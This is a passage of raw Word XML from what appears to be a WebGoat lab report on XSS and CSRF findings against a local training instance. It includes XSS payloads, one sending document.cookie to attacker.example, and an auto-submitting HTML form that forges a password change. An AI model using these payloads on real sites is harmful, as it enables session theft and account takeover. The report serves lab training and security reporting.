        <w:t>phoneHome</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>` or lesson completion message in the</w:t>
      </w:r>
      <w:r w:rsidR="00177A43">
        <w:t xml:space="preserve"> console</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8"/>
    <w:p w:rsidR="003213E8" w:rsidRDefault="00177A43" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> 3. </w:t>
      </w:r>
      <w:r w:rsidR="003213E8">
        <w:t>Atta</w:t>
      </w:r>
      <w:r>
        <w:t>ck Variants &amp; Example Payloads</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8"/>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r>
        <w:t>3.1 Reflected/DOM basi</w:t>
      </w:r>
      <w:r w:rsidR="00177A43">
        <w:t>c</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">=x </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>onerror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>="alert('XSS')"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r>
        <w:t>3.2 Stealthy console evidence (useful in labs)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">=x </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>onerror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">="console.log('phone home </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>said',document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>)"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r>
        <w:t xml:space="preserve"> 3.3 More realistic </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>exfiltration</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (lab-only; do NOT run on production systems you don't own)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">=x </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>onerror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00177A43">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>="new Image().src='http://attacker.example/steal?c='+encodeURIComponent(document.cookie)"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="00177A43" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> 4. </w:t>
      </w:r>
      <w:r w:rsidR="003213E8">
        <w:t>Why this is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> dangerous (real-world impact)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8"/>
    <w:p w:rsidR="003213E8" w:rsidRDefault="00177A43" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Session theft:</w:t>
      </w:r>
      <w:r w:rsidR="003213E8">
        <w:t xml:space="preserve"> If cookies/session tokens are accessible to JavaScript, attackers can steal them and impersonate users.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="00177A43" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Account takeover:</w:t>
      </w:r>
      <w:r w:rsidR="003213E8">
        <w:t xml:space="preserve"> Actions can be executed on behalf of the user (CSRF-like) while the user is authenticated.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Persistent X</w:t>
      </w:r>
      <w:r w:rsidR="00177A43">
        <w:t>SS (if stored):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> If the payload can be stored (e.g., in a database or profile) the impact is long-term and reaches multiple users.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="00177A43" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Phishing &amp; malware:</w:t>
      </w:r>
      <w:r w:rsidR="003213E8">
        <w:t xml:space="preserve"> Injected scripts can display fake login dialogs or deliver malware to visitors.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8"/>
    <w:p w:rsidR="003213E8" w:rsidRDefault="00177A43" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> 5. Root cause analysis</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8"/>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Untrusted</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> input (URL fragment or other user-supplied content) is inserted into the page DOM without proper encoding/escaping or sanitization.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>The site places user-controlled content into HTML (or uses `</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>innerHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>`) instead of text-safe APIs (`</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>textContent</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>`/`</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>innerText</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">`) or safe </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>templating</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> that encodes HTML special characters.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>No Content Security Policy (CSP) or weak CSP preventing inline scripts.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Possibly cookies are not marked `</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>HttpOnly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>`, allowing JavaScript access to session cookies</w:t>
      </w:r>
      <w:r w:rsidR="00177A43">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8"/>
    <w:p w:rsidR="003213E8" w:rsidRDefault="00177A43" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">6. </w:t>
      </w:r>
      <w:r w:rsidR="003213E8">
        <w:t>Proof / Evidence (what t</w:t>
      </w:r>
      <w:r>
        <w:t>o include in the final report)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="003213E8"/>
    <w:p w:rsidR="003213E8" w:rsidRDefault="00177A43" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Screenshot:</w:t>
      </w:r>
      <w:r w:rsidRPr="00177A4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213E8" w:rsidRDefault="005B152D" w:rsidP="003213E8">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5486400" cy="3366791"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="5" name="Picture 2" descr="C:\Users\patelrinku311\Downloads\Untitled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elrinku311\Downloads\Untitled desig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3E8" w:rsidRDefault="003213E8" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Page showing the injected content rendered (the UI where `test:` shows an image icon in your screenshot).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>DevTools</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Console showing `phone home said ...` and the `</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>lessonCompleted:tru</w:t>
      </w:r>
      <w:r w:rsidR="00177A43">
        <w:t>e</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00177A43">
        <w:t xml:space="preserve">` JSON recorded by </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00177A43">
        <w:t>WebGoat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00177A43">
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00177A43">
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> already captured this).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="00177A43" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Payload text:</w:t>
      </w:r>
      <w:r w:rsidR="003213E8">
        <w:t xml:space="preserve"> include both raw and URL-encoded payload used.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="00177A43" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Steps to reproduce: </w:t>
      </w:r>
      <w:r w:rsidR="003213E8">
        <w:t>exact URL used, browser, headers if relevant.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="00177A43" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Impact description:</w:t>
      </w:r>
      <w:r w:rsidR="003213E8">
        <w:t xml:space="preserve"> what an attacker could do in a real environment (session theft, defacement, stored XSS ramifications).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="003213E8" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidR="00177A43">
        <w:t>everity and recommended fixes:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as in section 6.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003213E8" w:rsidRDefault="00177A43" w:rsidP="00177A43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Mitigation verification: </w:t>
      </w:r>
      <w:r w:rsidR="003213E8">
        <w:t>after fixes are applied, test again; include screenshots confirming the payload does not execute.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005B152D" w:rsidRDefault="005665E0" w:rsidP="005B152D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="005B152D">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5486400" cy="3627677"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="54" name="Picture 54" descr="C:\Users\patelrinku311\Downloads\Untitled desig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atelrinku311\Downloads\Untitled design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46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46"/>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>(C) CSRF Findings — Results &amp; Outcomes</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46"/>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Title: Cross-Site Request Forgery (CSRF) — Password Change (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>WebGoat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> lesson)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Target: `http://localhost:8080/WebGoat` — *CSRF – Password Change* lesson</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRPr="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="Heading2Char"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Heading2Char"/>
        </w:rPr>
        <w:t xml:space="preserve">1. Summary </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">I discovered and successfully exploited a CSRF vulnerability in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>WebGoat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Password Change lesson that allowed an attacker-controlled page to submit a forged password-</w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>change request on behalf of an authenticated user, resulting in a password change without the victim’s consent.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> 2. Impact</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46"/>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t>An attacker who can trick an authenticated user into visiting a malicious webpage can change the user’s password. This enables account takeover (attacker or attacker-assisted login) or denial of access to the legitimate user. In real-world applications, such a vulnerability could permit unauthorized fund transfers, profile changes, or other sensitive state-changing actions.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Reproduction (steps performed)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46"/>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">Prerequisites: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>WebGoat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> running at `http://localhost:8080/WebGoat`. Two browser contexts: a Victim (logged-in session) and an Attacker (serves malicious page).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46"/>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">1. In the Victim browser, logged in as `guest/guest`, navigated to the CSRF lesson and submitted the Password Change form while capturing traffic with OWASP ZAP (or browser </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>DevTools</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> → Network).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t>2. Observed original request details:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46"/>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">   POST http://localhost:8080/WebGoat/attack/csrf/changePassword</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">   Content-Type: application/x-www-form-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>urlencoded</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">   Cookie: JSESSIONID=abcd1234...</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46"/>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">   password=hacked123&amp;confirm=hacked123</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t>3. On the Attacker machine, created `csrf_attack.html` with an auto-submitting form that mirrors the POST URL and parameter names:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46"/>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">   ```html</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">   &lt;!</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>doctype</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">   &lt;html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">     &lt;head&gt;&lt;meta </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>charset</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>="utf-8"&gt;&lt;title&gt;CSRF demo&lt;/title&gt;&lt;/head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">     &lt;body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">       &lt;h3&gt;Loading...&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">       &lt;form id="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>csrfForm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>" action="http://localhost:8080/WebGoat/attack/csrf/changePassword" method="POST"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">         &lt;input type="hidden" name="password" value="hacked123"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">         &lt;input type="hidden" name="confirm" value="hacked123"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">       &lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">       &lt;script&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>window.onload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = function(){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csrfForm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>').submit(); }&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">     &lt;/body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">   &lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
